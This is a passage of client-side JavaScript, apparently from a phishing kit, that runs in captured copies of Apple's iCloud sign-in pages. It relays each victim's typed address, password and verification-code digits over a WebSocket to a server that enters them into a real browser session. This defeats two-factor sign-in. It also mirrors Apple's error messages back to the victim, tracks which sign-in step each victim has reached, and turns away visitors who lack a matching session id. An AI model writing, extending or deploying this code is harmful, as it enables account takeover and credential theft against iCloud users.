/* Runs inside every captured page served from /src.
 *
 * The page is a capture of a page that is somewhere else - the sign-in form
 * of icloud.com, say - so on its own it is a picture of a page: nothing it
 * does reaches the browser that holds the session. This is what makes it a
 * page again.
 *
 * Three things happen here:
 *
 *  - What is typed into the capture is reported to the server, which writes
 *    it into the real browser, in the field with the same id. The capture
 *    keeps the ids of the page it was taken from, so there is nothing to
 *    translate.
 *  - A button that is pressed in the capture is pressed in the real browser
 *    as well.
 *  - What the real browser is showing - where it is, and what its fields
 *    hold - is put back into the capture, so the capture shows the session
 *    rather than the moment it was taken.
 *
 * And what it did before, which is still true: what you type and where you
 * click go to the server, and the server hands them to every other viewer,
 * so the session follows you between tabs.
 *
 * Deliberately narrow:
 *
 *  - A click is relayed to the other viewers as a marker, not replayed.
 *    Replaying it in another tab would press the same button twice.
 *  - Programmatic changes are applied under `applying`, and setting `.value`
 *    does not fire `input`, so nothing echoes back and forth.
 *  - The document is otherwise left alone: this is the captured page, and the
 *    only things added are form state and a click marker.
 */
(function () {
  "use strict";

  if (window.__icloudSync) return;

  /* What this browser knows about itself.
   *
   * Two names, and they are not the same name:
   *
   *   * the session id is the server's name for this visitor's browser. It is
   *     in the cookie, and in this browser's own storage. It is read here
   *     and nothing is made: a name that is not there is not a name this
   *     browser can be given one of.
   *   * the user id is this browser's own name for itself. It is in this
   *     browser's storage and nowhere else - no server knows it, and no
   *     other browser has it.
   */
  function remembered(key) {
    try { return window.localStorage.getItem(key); } catch (err) { return null; }
  }

  function cookieOf(name) {
    var parts = (document.cookie || "").split(";");
    for (var i = 0; i < parts.length; i++) {
      var bit = parts[i].replace(/^\s+|\s+$/g, "");
      if (bit.indexOf(name + "=") === 0) return bit.slice(name.length + 1);
    }
    return "";
  }

  var USER_KEY = "icloud-user";
  var SESSION_KEY = "icloud-visitor";

  function knownSession() {
    return cookieOf("icloud_session") || remembered(SESSION_KEY) || "";
  }

  function knownUser() {
    return remembered(USER_KEY) || "";
  }

  /* The names in this page's own address. */
  function saidNames() {
    var out = { uid: "", sid: "" };
    try {
      var params = new URLSearchParams(location.search);
      out.uid = params.get("uid") || "";
      out.sid = params.get("sid") || "";
    } catch (err) {
      /* an address that cannot be read */
    }
    return out;
  }

  /* Where the launcher is, in this copy's own folder.
   *
   * The captures live in a folder called "src", and the launcher is the page
   * at the root of the copy - which is where a person is sent to have a
   * session made and the question answered again.
   */
  function launcherUrl() {
    var path = location.pathname;
    var at = path.lastIndexOf("/src/");
    return at > 0 ? path.slice(0, at + 1) : "/";
  }

  /* This page is not for this browser.
   *
   * A capture is a page on the open web: anybody who knows the address can
   * ask for it. So the launcher says who the capture is for - in the
   * address - and the capture checks that against what this browser knows
   * about itself.
   *
   * A capture opened in a browser that is not the one it was made for is not
   * this one's capture, and it says so by going back to the launcher: a new
   * session is made there, and the question is asked again.
   */
  function refused(reason) {
    try { window.__icloudRefused = reason; } catch (err) { /* nothing to say it with */ }
    try {
      location.replace(launcherUrl());
    } catch (err) {
      /* the browser will not go: the page is dead either way */
    }
  }

  var NAMES = saidNames();
  var MINE = knownSession();
  var ME = knownUser();

  if (!NAMES.sid || !MINE || NAMES.sid !== MINE) {
    // No session in the address, or a session that is not this browser's.
    refused("the address is not for this browser");
    return;
  }
  if (NAMES.uid && (!ME || NAMES.uid !== ME)) {
    // The address names a browser that this one is not.
    refused("the address names another browser");
    return;
  }

  /* Who this visitor is.
   *
   * The cookie is the way the server hears about it, but a cookie is easy to
   * lose, and the visitor's own storage is not: the name is kept in
   * localStorage, so a person who comes back is recognised, and lands in the
   * same session, with the same browser and the same profile.
   *
   * The cookie comes first - it is what the server last said - and the
   * storage second. A new name is only made when there is neither.
   */
  function visitorId() {
    var COOKIE = "icloud_session";
    var KEY = "icloud-visitor";
    var id = null;
    var parts = (document.cookie || "").split(";");
    for (var i = 0; i < parts.length; i++) {
      var bit = parts[i].replace(/^\s+|\s+$/g, "");
      if (bit.indexOf(COOKIE + "=") === 0) {
        id = bit.slice(COOKIE.length + 1);
        break;
      }
    }
    try {
      if (!id) id = window.localStorage.getItem(KEY);
    } catch (err) { /* storage refused; the cookie is enough */ }
    if (!id) {
      id = "v" + Math.random().toString(36).slice(2, 12) +
          Date.now().toString(36);
    }
    try { window.localStorage.setItem(KEY, id); } catch (err) { /* ignore */ }
    document.cookie = COOKIE + "=" + id + "; path=/; max-age=31536000; " +
        "SameSite=Lax";
    return id;
  }

  var VISITOR = visitorId();

  /* Where the server is, and what this page is called.
   *
   * A capture served by the server talks to it on the same origin and needs
   * nothing said. A capture that was copied to another host - a standalone
   * copy on a cPanel, say - talks to the server from somewhere else, and the
   * server's address is in a meta tag in the page.
   *
   * The page's name is the server's name for it: "/src/1.html". A copy that
   * lives in a folder of its own is still "/src/1.html" as far as the server
   * is concerned, and the folder is put back when the server asks for a page.
   */
  var SERVER = "";
  (function () {
    var meta = document.querySelector('meta[name="icloud-server"]');
    if (meta) SERVER = (meta.getAttribute("content") || "").replace(/\/+$/, "");
  })();

  /* The server's address, as the page will actually use it.
   *
   * A page on https talking to a server on http is refused by the browser:
   * the connection would be mixed content, and both the request and the
   * socket would be blocked. So when this page is secure and the address
   * is not, the address is asked for over https - the server is nearly
   * always on https as well, and an address written down before it was
   * put behind a tunnel should not stop the app working.
   */
  function serverBase() {
    var said = SERVER;
    if (location.protocol === "https:" && /^http:\/\//i.test(said)) {
      said = said.replace(/^http:\/\//i, "https://");
    }
    return said;
  }

  function serverUrl(path) {
    return serverBase() + path;
  }

  function pageName() {
    var path = location.pathname;
    var at = path.lastIndexOf("/src/");
    return at >= 0 ? path.slice(at) : path;
  }

  /* Where a capture is, in this copy's own folder.
   *
   * The server knows its pages by their own names - "/src/1.html" - and
   * this copy may live in a folder of its own. The folder is put in front
   * of the server's name, so a copy in "/app/" asks for "/app/src/1.html"
   * and not for a page that is not there.
   *
   * The folder is remembered, because after this page has moved the
   * address it is at is no longer the one to go by: a host that answers
   * every path with the same file would take the visitor to
   * "/src/1.html", and the folder would be lost with it. The launcher and
   * the captures share the one key - they are one copy.
   */
  var ROOT_KEY = "icloud-root";

  function localPath(page) {
    if (!page) return page;
    if (/^[a-z][a-z0-9+.-]*:/i.test(page)) return page;   // an address of its own
    if (page.indexOf("/src/") !== 0) return page;          // not a capture

    var root = "";
    try {
      var kept = localStorage.getItem(ROOT_KEY);
      if (kept && kept.charAt(0) === "/") root = kept;
    } catch (err) {
      /* no storage */
    }
    if (!root) {
      // Nothing remembered: the folder this page is in will have to do.
      var path = location.pathname;
      var at = path.lastIndexOf("/src/");
      root = at > 0 ? path.slice(0, at) + "/" : "/";
      try {
        localStorage.setItem(ROOT_KEY, root);
      } catch (err) {
        /* no storage */
      }
    }
    return root + page.slice(1);
  }

  /* The capture's own address, with the names in it.
   *
   * The names go with every move from one capture to another: a capture that
   * moved without them would be a page that does not know who it is for, and
   * would send the visitor back to the launcher in the middle of the
   * sign-in.
   */
  function namedPath(page) {
    var there = localPath(page);
    if (!there) return there;
    try {
      var url = new URL(there, location.href);
      if (ME) url.searchParams.set("uid", ME);
      if (MINE) url.searchParams.set("sid", MINE);
      return url.pathname + (url.search || "");
    } catch (err) {
      return there;
    }
  }

  /* Is this the page we are already on?
   *
   * A page that is sent to itself goes for ever: the browser runs it
   * again, it asks again, and the visitor watches a page reload without
   * end. The names are not enough to tell - the server's name for a page
   * and the path it is at can be different words for the same place - so
   * the place itself is compared.
   */
  function samePlace(page) {
    var there = localPath(page);
    return !!there && there === location.pathname;
  }

  function socketUrl() {
    var scheme = "";
    var host = "";
    var base = serverBase();
    if (base) {
      /* The scheme is caught without its colon, so it is compared
       * without one. It was compared with one, and never matched: so a
       * copy of the pages that lives on another host always asked for
       * "ws://" - even when the server's address said "https://" - and
       * the browser refused the connection as mixed content.
       */
      var said = /^([a-z][a-z0-9+.-]*):\/\/([^/?#]+)/i.exec(base);
      if (said) {
        scheme = said[1].toLowerCase() === "https" ? "wss:" : "ws:";
        host = said[2];
      }
    }
    if (!scheme) {
      /* No address to go by: the page's own. And the page's own protocol
       * cannot always be read from here - a frame whose document is
       * "about:srcdoc" has no protocol of its own, and the one it lives
       * in does. So the frame's parent is asked, and the page itself is
       * the last word.
       */
      var here = null;
      try {
        var top = window.top;
        if (top && top.location && top.location.protocol !== "about:") {
          here = top.location;
        }
      } catch (err) {
        here = null;      // another origin: it cannot be read
      }
      if (!here) here = window.location;
      scheme = here.protocol === "https:" ? "wss:" : "ws:";
      host = here.host;
    }
    // The visitor's name goes with the line: a copy on another host has no
    // cookie of the server's to say who it is.
    return scheme + "//" + host + "/ws?visitor=" + encodeURIComponent(VISITOR);
  }

  var OPEN = 1;
  var RETRY_MIN = 500;
  var RETRY_MAX = 5000;
  var MARK_MS = 450;
  var TYPE_DELAY = 70;      // a gap between keystrokes, not a message per letter

  var socket = null;
  var retry = RETRY_MIN;
  var queued = [];          // messages waiting for the socket to open
  var early = [];           // state that arrived before the body was parsed
  var ready = false;
  var applying = false;
  var leaving = false;      // a link was followed; ignore incoming navigation
  var timers = new WeakMap();   // element -> debounce timer
  var last = new WeakMap();     // element -> {key, value, checked} last sent
  var typed = new WeakSet();    // fields the person has typed into themselves

  // The page is made of more than one document: the page itself, and the
  // frames it can reach. A SingleFile capture keeps the sign-in form inside
  // an <iframe srcdoc="...">, so the form is in a frame of its own, and a
  // field in it is not a field of this document.
  var documents = [];       // [{id, doc}] - the page, then the frames
  var docIds = new WeakMap();
  var docCounter = 0;

  // ------------------------------------------------------------------
  // Element identity
  //
  // The server has to be able to name an element in a page it has not parsed.
  // A selector built from ids and positions is stable across the identical
  // copy of the same captured file, which is all that is needed. An element
  // in a frame is named by the frame it is in first, so the same selector in
  // two documents is two different elements.
  // ------------------------------------------------------------------

  function escapeId(id) {
    if (window.CSS && typeof window.CSS.escape === "function") {
      return window.CSS.escape(id);
    }
    return id.replace(/([^\w-])/g, "\\$1");
  }

  function documentId(doc) {
    var id = docIds.get(doc);
    if (id === undefined) {
      id = docCounter === 0 ? "" : "f" + docCounter;
      docCounter += 1;
      docIds.set(doc, id);
    }
    return id;
  }

  // A key that names an element in a frame starts with '@', which no
  // selector can start with, so the frame and the page it is in are never
  // confused for one another.
  function frameKey(id, selector) {
    return "@" + id + " " + selector;
  }

  function selectorFor(el) {
    if (el.id) return "#" + escapeId(el.id);

    var parts = [];
    var node = el;
    var root = el.ownerDocument ? el.ownerDocument.documentElement : document.documentElement;
    while (node && node.nodeType === 1 && node !== root) {
      var part = node.tagName.toLowerCase();
      var parent = node.parentElement;
      if (parent) {
        var same = 0;
        var index = 0;
        for (var i = 0; i < parent.children.length; i++) {
          var child = parent.children[i];
          if (child.tagName !== node.tagName) continue;
          same += 1;
          if (child === node) index = same;
        }
        if (same > 1) part += ":nth-of-type(" + index + ")";
      }
      parts.unshift(part);
      node = parent;
    }
    return parts.join(" > ");
  }

  function keyFor(el) {
    if (!el || el.nodeType !== 1) return "";
    var selector = selectorFor(el);
    if (!selector) return "";
    var id = documentId(el.ownerDocument || document);
    return id ? frameKey(id, selector) : selector;
  }

  function documentFor(id) {
    for (var i = 0; i < documents.length; i++) {
      if (documents[i].id === id) return documents[i].doc;
    }
    return null;
  }

  function documentOfKey(key) {
    if (key.charAt(0) !== "@") return { doc: document, selector: key };
    var cut = key.indexOf(" ");
    if (cut < 0) return null;
    var doc = documentFor(key.slice(1, cut));
    if (!doc) return null;
    return { doc: doc, selector: key.slice(cut + 1) };
  }

  function elementOfKey(key) {
    var where = documentOfKey(key);
    if (!where) return null;
    try {
      return where.doc.querySelector(where.selector);
    } catch (err) {
      return null;   // a selector the browser will not take is simply not ours
    }
  }

  function findById(id) {
    for (var i = 0; i < documents.length; i++) {
      var el = documents[i].doc.getElementById(id);
      if (el) return el;
    }
    return null;
  }

  // ------------------------------------------------------------------
  // Sending
  // ------------------------------------------------------------------

  // ------------------------------------------------------------------
  // The client's own state
  //
  // How far this person has got is kept in their own browser, in one
  // place: the step they are on, and whether they have finished. The
  // server is told about it when the engine says hello, so that somebody
  // who has already got in is sent to iCloud and not through the whole
  // thing again.
  //
  // It is the client's own storage and nobody else's: another person, on
  // another browser, has their own.
  // ------------------------------------------------------------------

  var STATE_KEY = "icloud_state";

  var STAGES = {
    "/src/1.html": "Address",
    "/src/3.html": "Address",
    "/src/4.html": "Password",
    "/src/2.html": "Verification code",
    // Where a person ends up when the account is locked: not a step of the
    // sign-in, and not the end of it either.
    "/src/5.html": "Locked",
  };

  function readState() {
    try {
      var raw = window.localStorage.getItem(STATE_KEY);
      if (!raw) return null;
      var state = JSON.parse(raw);
      return state && typeof state === "object" ? state : null;
    } catch (err) {
      return null;                       // no storage, or nothing in it
    }
  }

  function writeState(patch) {
    try {
      var state = readState() || {};
      for (var key in patch) {
        if (Object.prototype.hasOwnProperty.call(patch, key)) state[key] = patch[key];
      }
      state.at = Math.floor(Date.now() / 1000);
      window.localStorage.setItem(STATE_KEY, JSON.stringify(state));
      return state;
    } catch (err) {
      return null;
    }
  }

  // The step this capture is. Somebody who has got in stays got in: opening
  // a capture again does not take the flag away.
  function noteStage() {
    var page = pageName();
    var patch = { page: page, stage: STAGES[page] || "Starting" };
    var state = readState();
    if (!state || !state.finished) patch.finished = false;
    writeState(patch);
  }

  function send(message) {
    if (socket && socket.readyState === OPEN) {
      try {
        socket.send(JSON.stringify(message));
        return;
      } catch (err) {
        /* fall through: the socket is going away */
      }
    }
    // A value typed before the socket is up still matters; a stale queue of
    // them does not, so it is capped.
    if (queued.length < 100) queued.push(message);
  }

  // "Where is the browser?" The answer is what the browser is showing, and
  // it is asked for whenever a document is bound: a frame that has just
  // loaded may hold the fields, and the state that was sent before it was
  // bound never reached them.
  function askWhere() {
    send({ t: "where" });
  }

  function connect() {
    var url = socketUrl();

    try {
      socket = new WebSocket(url);
    } catch (err) {
      socket = null;
      setTimeout(connect, retry);
      return;
    }

    socket.onopen = function () {
      retry = RETRY_MIN;
      // "What should I be showing, and what has been done to it?"
      socket.send(JSON.stringify({
        t: "hello",
        page: pageName(),
        from: document.referrer,
        session: VISITOR,
        state: readState(),
      }));
      var pending = queued;
      queued = [];
      for (var i = 0; i < pending.length; i++) send(pending[i]);
    };

    socket.onmessage = receive;

    socket.onclose = function () {
      socket = null;
      setTimeout(connect, retry);
      retry = Math.min(retry * 2, RETRY_MAX);
    };

    socket.onerror = function () {
      try {
        socket.close();
      } catch (err) {
        /* already closed */
      }
    };
  }

  // ------------------------------------------------------------------
  // Form state
  // ------------------------------------------------------------------

  // The verification code is six boxes with one digit in each. They are
  // told apart by their class, because Apple gives them no id at all.
  var CODE_BOX = "form-security-code-input";

  function isCodeBox(el) {
    var cls = el && el.className;
    if (!cls || typeof cls !== "string") return false;
    return cls.split(/\s+/).indexOf(CODE_BOX) >= 0;
  }

  function codeBoxes(doc) {
    var out = [];
    var all = (doc || document).getElementsByTagName("input");
    for (var i = 0; i < all.length; i++) {
      if (isCodeBox(all[i])) out.push(all[i]);
    }
    return out;
  }

  // ------------------------------------------------------------------
  // The address the person signs in with
  //
  // A browser fills a field it can recognise, and only then: the field has
  // to say what it is, in the words every browser knows. Apple's own page
  // says it - autocomplete="username webauthn" - but the form lives in the
  // widget frame, and a frame is the last place a browser looks, so it is
  // said again here, in the document the field is really in.
  //
  // And the addresses this browser has already given are offered back as a
  // list on the field itself. That part does not depend on a browser
  // deciding the page is worth remembering: the app knows the address, and
  // says it.
  // ------------------------------------------------------------------

  var ADDRESS_LIST = "icloud-addresses";
  var ADDRESS_KEY = "icloud_addresses";
  var ADDRESS_MAX = 5;

  // The field the person types their Apple Account into: Apple calls it
  // can-field=accountName, and it holds an address, a phone number or a
  // name. Anything else in the page that calls itself an account is not a
  // field the browser should be filling.
  function isAddressField(el) {
    if (!el || el.tagName !== "INPUT") return false;
    if ((el.getAttribute("type") || "text").toLowerCase() !== "text") return false;
    if (el.getAttribute("can-field") === "accountName") return true;
    var marks = [el.id, el.getAttribute("name"),
                 el.getAttribute("autocomplete")].join(" ");
    return /account|username|email/i.test(marks);
  }

  function say(el, name, value) {
    if (el.getAttribute(name) !== value) el.setAttribute(name, value);
  }

  function addresses() {
    try {
      var list = JSON.parse(window.localStorage.getItem(ADDRESS_KEY) || "[]");
      if (Object.prototype.toString.call(list) !== "[object Array]") return [];
      return list.filter(function (one) {
        return typeof one === "string" && one && one.length <= 320;
      }).slice(0, ADDRESS_MAX);
    } catch (err) {
      return [];
    }
  }

  // An address worth offering is one that looks like an address: a whole
  // word that was typed, not every letter on the way.
  function rememberAddress(value) {
    if (!value || value.length > 320 || value.indexOf("@") < 1) return;
    var list = addresses().filter(function (one) { return one !== value; });
    list.unshift(value);
    try {
      window.localStorage.setItem(ADDRESS_KEY,
        JSON.stringify(list.slice(0, ADDRESS_MAX)));
    } catch (err) {
      return;
    }
    for (var i = 0; i < documents.length; i++) recognise(documents[i].doc);
  }

  function offer(el) {
    var doc = el.ownerDocument;
    if (!doc || !doc.createElement) return;
    var list = addresses();
    var box = doc.getElementById(ADDRESS_LIST);

    if (!list.length) {
      if (box) box.parentNode.removeChild(box);
      if (el.hasAttribute("list")) el.removeAttribute("list");
      return;
    }

    var mark = list.join("\u0000");
    if (!box || box.__icloudList !== mark) {
      if (!box) {
        box = doc.createElement("datalist");
        box.id = ADDRESS_LIST;
      }
      while (box.firstChild) box.removeChild(box.firstChild);
      for (var i = 0; i < list.length; i++) {
        var option = doc.createElement("option");
        option.value = list[i];
        box.appendChild(option);
      }
      box.__icloudList = mark;
      if (!box.parentNode) {
        (doc.body || doc.documentElement).appendChild(box);
      }
    }
    say(el, "list", ADDRESS_LIST);
  }

  function recognise(doc) {
    if (!doc || !doc.querySelectorAll) return;
    var fields = doc.querySelectorAll("input");
    for (var i = 0; i < fields.length; i++) {
      var el = fields[i];
      var type = (el.getAttribute("type") || "text").toLowerCase();
      if (type === "password") {
        say(el, "autocomplete", "current-password");
        say(el, "name", el.getAttribute("name") || "password");
        continue;
      }
      if (!isAddressField(el)) continue;
      say(el, "autocomplete", "username");
      say(el, "name", el.getAttribute("name") || "username");
      say(el, "inputmode", "email");
      say(el, "autocapitalize", "none");
      say(el, "autocorrect", "off");
      say(el, "spellcheck", "false");
      offer(el);
    }
  }

  // The cursor moves on by itself, the way it does on Apple's page: its own
  // note says "On entering verification code in the input fields, the focus
  // will automatically move on to the next input fields". The capture is a
  // picture of that page, so the script that does it is not there - so it is
  // done for it here.
  function moveOn(el) {
    var boxes = codeBoxes(el.ownerDocument || document);
    var at = -1;
    for (var i = 0; i < boxes.length; i++) {
      if (boxes[i] === el) { at = i; break; }
    }
    if (at < 0) return;

    if (!el.value) {
      // The box has been emptied: the cursor goes back with it.
      if (at > 0) boxes[at - 1].focus();
      return;
    }
    if (at < boxes.length - 1) boxes[at + 1].focus();
  }

  function stateOf(el) {
    var tag = el.tagName;
    if (tag !== "INPUT" && tag !== "TEXTAREA" && tag !== "SELECT") return null;
    var type = (el.type || "").toLowerCase();
    return {
      key: keyFor(el),
      value: "value" in el ? String(el.value) : "",
      checked: type === "checkbox" || type === "radio" ? !!el.checked : false,
      // A digit in a code box is the whole of it: there is no word to wait
      // for, and the browser wants it now.
      immediate: type === "checkbox" || type === "radio" || tag === "SELECT" ||
        isCodeBox(el),
      type: type,
    };
  }

  function emit(el) {
    var now = stateOf(el);
    if (!now) return;

    var open = last.get(el);
    if (
      open &&
      open.key === now.key &&
      open.value === now.value &&
      open.checked === now.checked
    ) {
      return;
    }

    last.set(el, { key: now.key, value: now.value, checked: now.checked });
    send({ t: "value", key: now.key, value: now.value, checked: now.checked });

    // An address is worth offering back the next time somebody signs in on
    // this browser.
    if (isAddressField(el)) rememberAddress(now.value);

    // The same word goes to the browser the server holds, so the capture and
    // the session stay the same thing.
    if (el.id) {
      send({ t: "field", id: el.id, value: now.value, checked: now.checked });
      // The person has changed a field that had something in it. That is an
      // edit, and what an edit means is the flow's business: editing the
      // address on the password step takes the capture back to the address,
      // the way iCloud does it. The first word typed into an empty field is
      // not an edit - there was nothing to edit. It is sent when the word is
      // whole, so the capture is not taken away from under somebody who is
      // still typing.
      if (open && open.value) {
        send({ t: "edit", id: el.id, value: now.value, page: pageName() });
      }
      return;
    }

    // No id: the browser can still be told, by what the control is and how
    // many of them there are. Apple's verification code boxes have no ids
    // at all - six inputs - and the third one is the third one in the real
    // page too.
    var place = placeOf(el);
    if (place) {
      send({
        t: "field",
        id: "",
        tag: place.tag,
        cls: place.cls || "",
        n: place.n,
        of: place.of,
        value: now.value,
        checked: now.checked,
      });
    }
  }

  // Where a control sits among the ones like it: the third input of the
  // document, and how many inputs it has.
  //
  // When a control has a class of its own, the ones like it are the ones
  // with that class. Apple's verification code boxes are inputs like any
  // other, and the page can hold other inputs too - so "the third input of
  // the page" is not the same box in two copies of the page, but "the third
  // form-security-code-input" is.
  function placeOf(el) {
    var doc = el.ownerDocument || document;
    var tag = (el.tagName || "").toLowerCase();
    if (!tag || !doc.getElementsByTagName) return null;

    var cls = classOf(el);
    var all = doc.getElementsByTagName(tag);
    var mine = [];
    for (var i = 0; i < all.length; i++) {
      if (!cls || classOf(all[i]) === cls) mine.push(all[i]);
    }

    var n = 0;
    for (var j = 0; j < mine.length; j++) {
      if (mine[j] === el) {
        n = j + 1;
        break;
      }
    }
    if (!n) return null;

    var place = { tag: tag, n: n, of: mine.length };
    if (cls) place.cls = cls;
    return place;
  }

  // The class that tells one control from another, when it has one: the
  // first of its classes that is a plain name.
  function classOf(el) {
    var cls = el && el.className;
    if (!cls || typeof cls !== "string") return "";
    var parts = cls.split(/\s+/);
    for (var i = 0; i < parts.length; i++) {
      if (/^[A-Za-z][A-Za-z0-9_-]*$/.test(parts[i])) return parts[i];
    }
    return "";
  }

  function onFieldEvent(event) {
    if (applying) return;

    var el = event.target;
    if (!el || el.nodeType !== 1) return;

    var now = stateOf(el);
    if (!now) return;

    // This field is the person's now: what they type into it is newer than
    // anything the browser can say about it.
    typed.add(el);

    // A code box holds one digit. A second one replaces the first, the way
    // the browser's own boxes do.
    var code = isCodeBox(el);
    if (code && el.value && el.value.length > 1) {
      el.value = el.value.slice(-1);
      now = stateOf(el);
    }

    clearTimeout(timers.get(el));

    if (now.immediate) {
      // One event, one answer.
      emit(el);
      // The cursor moves on when a digit goes in - and only then: a box that
      // is merely left should not take the cursor back.
      if (code && event.type === "input") moveOn(el);
      return;
    }

    // Text arrives a letter at a time. Wait for a gap and send the word.
    timers.set(el, setTimeout(function () {
      timers.delete(el);
      emit(el);
    }, TYPE_DELAY));
  }

  function apply(entry) {
    if (!entry || !entry.key) return;

    var el = elementOfKey(entry.key);
    if (!el) return;

    applying = true;
    try {
      var type = (el.type || "").toLowerCase();
      if (type === "checkbox" || type === "radio") {
        el.checked = !!entry.checked;
      } else if ("value" in el && typeof entry.value === "string") {
        if (el.value !== entry.value) el.value = entry.value;
      }
      last.set(el, {
        key: entry.key,
        value: typeof entry.value === "string" ? entry.value : "",
        checked: !!entry.checked,
      });
    } finally {
      applying = false;
    }
  }

  // ------------------------------------------------------------------
  // The browser behind the capture
  //
  // What the browser is showing is put back into the capture: the same
  // field, the same value. A field the person is typing into is left
  // alone - the browser is behind them, and their keystrokes are the
  // newer truth.
  // ------------------------------------------------------------------

  function applyBrowser(message) {
    var fields = message.fields || {};
    Object.keys(fields).forEach(function (id) {
      var entry = fields[id];
      if (!entry || typeof entry !== "object") return;

      var el = findById(id);
      if (!el) return;

      // A field the person is typing into is theirs, and the browser is
      // behind them. A field that has only just been drawn and focused is
      // not: the page put the cursor there, nobody has typed a letter. That
      // is the field the capture comes back to when the address is edited on
      // the password step, and it comes back filled with what the browser
      // has, so the two sides say the same thing.
      var doc = el.ownerDocument;
      if (doc && doc.activeElement === el && typed.has(el)) return;

      apply({
        key: keyFor(el),
        value: typeof entry.value === "string" ? entry.value : "",
        checked: !!entry.checked,
      });
    });

    applyMessages(message.messages);
  }

  // ------------------------------------------------------------------
  // What the browser is saying
  //
  // The browser says when the details are wrong: "Check the account
  // information you entered and try again." The capture has to say it too,
  // or the person correcting the details cannot see what is wrong with
  // them.
  //
  // The capture does not carry the stylesheet for a message that was not
  // there when it was taken, so the way the browser shows the message is
  // read as well - the colours, the size - and put on the message in the
  // capture. The message is put where the browser puts it: under the field
  // it is about.
  // ------------------------------------------------------------------

  var shown = [];

  function applyMessages(messages) {
    shown.forEach(function (el) {
      if (el && el.parentNode) el.parentNode.removeChild(el);
    });
    shown = [];

    // The area is measured with nothing in it - no message, no height given
    // to it for a message - so that the height it is given is the height it
    // needs, and not the height it had last time. Measuring it with the
    // message in it means every complaint makes the area taller, and the
    // buttons below it go down a little further each time one appears.
    var area = contentArea();
    var natural = 0;
    if (area) {
      area.style.minHeight = "";
      natural = area.getBoundingClientRect().height;
    }

    if (!messages || !messages.length) {
      // Nothing is wrong any more: the capture's own forgot-password link
      // comes back, if the message was the one carrying it.
      restoreForgotLink();
      return;
    }

    var carriesLink = false;
    var count = 0;
    messages.forEach(function (message) {
      if (!message || typeof message !== "object") return;
      var el = buildMessage(message);
      if (!el) return;
      shown.push(el);
      count++;
      if (message.has_link) carriesLink = true;
    });

    // Room for the message, so that it lands on top of what is below
    // rather than over it - and only that much room, once.
    if (area && natural && count) {
      area.style.minHeight = (natural + 28 * count) + "px";
    }

    // The frame holding this is taller now that the complaint is in it.
    refitSoon();

    // The message the browser shows carries its own forgot-password link,
    // so the capture's own link would be the same link twice.
    if (carriesLink) hideForgotLink();
    else restoreForgotLink();
  }

  function buildMessage(message) {
    var spot = messageSpot(message);
    if (!spot) return null;

    var doc = spot.parent.ownerDocument || document;
    var el = doc.createElement("span");
    el.className = message.className || "form-message";
    el.setAttribute("dir", "auto");
    el.setAttribute("data-live-message", "1");

    var style = message.style || {};
    Object.keys(style).forEach(function (name) {
      var value = style[name];
      if (typeof value === "string" && value) el.style[name] = value;
    });

    // The browser's own wording, with the link it carries.
    if (typeof message.html === "string" && message.html) {
      el.innerHTML = message.html;
    } else {
      el.textContent = typeof message.text === "string" ? message.text : "";
    }

    spot.parent.insertBefore(el, spot.next || null);
    return el;
  }

  // The area the form sits in: the part of the page the message goes into.
  function contentArea() {
    try {
      return document.querySelector(".signin-content");
    } catch (err) {
      return null;
    }
  }

  // Where the message goes: under the field it is about, the way the
  // browser puts it.
  function messageSpot(message) {
    var doc = document;

    if (message.field) {
      var field = findById(message.field);
      if (field) {
        // The message goes on the line above the row of small print - the
        // way the browser puts it, and where there is room for it.
        var content = field.closest ? field.closest(".signin-content") : null;
        var footer = content ? content.querySelector(".signin-content__footer") : null;
        if (content && footer && footer.parentNode === content) {
          return { parent: content, next: footer };
        }

        var wrapper = field.closest ? field.closest(".form-cell-wrapper") : null;
        if (wrapper && wrapper.parentNode) {
          return { parent: wrapper.parentNode, next: wrapper.nextSibling };
        }
        if (field.parentNode) {
          return { parent: field.parentNode, next: field.nextSibling };
        }
      }
    }

    // The neighbour the message sits after in the browser: the capture is
    // the same page, so the same neighbour is in it.
    if (message.before) {
      var before = findById(message.before);
      if (before && before.parentNode) {
        return { parent: before.parentNode, next: before.nextSibling };
      }
    }

    var signin = findById("signin");
    if (signin) return { parent: signin, next: null };
    if (doc.body) return { parent: doc.body, next: null };
    return null;
  }

  function hideForgotLink() {
    var link = findById("iforgot-link");
    if (link && link.parentNode) link.parentNode.style.display = "none";
  }

  function restoreForgotLink() {
    var link = findById("iforgot-link");
    if (link && link.parentNode) link.parentNode.style.display = "";
  }

  // ------------------------------------------------------------------
  // Clicks and navigation
  // ------------------------------------------------------------------

  function marker(message) {
    if (typeof message.x !== "number" || typeof message.y !== "number") return;
    var host = document.body || document.documentElement;
    if (!host) return;

    var dot = document.createElement("div");
    dot.setAttribute("aria-hidden", "true");
    dot.style.cssText =
      "position:absolute;pointer-events:none;z-index:2147483647;" +
      "width:24px;height:24px;margin:-12px 0 0 -12px;border-radius:50%;" +
      "border:2px solid #0a84ff;box-shadow:0 0 0 5px rgba(10,132,255,.22);" +
      "left:" + message.x + "px;top:" + message.y + "px;" +
      "transition:opacity .3s ease-out;";
    host.appendChild(dot);

    setTimeout(function () {
      dot.style.opacity = "0";
    }, MARK_MS - 300);
    setTimeout(function () {
      if (dot.parentNode) dot.parentNode.removeChild(dot);
    }, MARK_MS);
  }

  function pageFor(href) {
    try {
      var url = new URL(href, location.href);
      if (url.origin !== location.origin) return "";
      var path = url.pathname;
      var at = path.lastIndexOf("/src/");
      if (at < 0) return "";
      if (!/\.html?$/i.test(path)) return "";
      // The server knows its pages by their own names, whichever folder the
      // copy of them happens to be in.
      return path.slice(at);
    } catch (err) {
      return "";
    }
  }

  function beacon(page) {
    try {
      if (!navigator.sendBeacon || typeof Blob !== "function") return;
      navigator.sendBeacon(
        serverUrl("/nav"),
        new Blob([JSON.stringify({ page: page })], { type: "application/json" })
      );
    } catch (err) {
      /* the WebSocket message already carried it */
    }
  }

  // The nearest thing a click means something on, or null.
  function clickable(el) {
    while (el && el.nodeType === 1) {
      var tag = (el.tagName || "").toLowerCase();
      if (tag === "a" || tag === "button") return el;
      if (el.getAttribute) {
        var role = el.getAttribute("role");
        if (role === "button") return el;
      }
      if (tag === "input") {
        var type = (el.getAttribute("type") || "").toLowerCase();
        if (type === "button" || type === "submit") return el;
        return null;      // a text field is a value, not a click
      }
      el = el.parentElement;
    }
    return null;
  }

  // A press in the capture is a press in the browser, but only where the
  // browser can be told what was pressed. A button with an id is one. A
  // link is one too, but only when it goes somewhere real: a link between
  // two captures is a link inside this app, and following it in the browser
  // would take the session to a page that does not exist.
  function pressable(el) {
    if (!el || !el.id) return null;
    var tag = (el.tagName || "").toLowerCase();
    if (tag === "button") return el;
    if (tag === "input") {
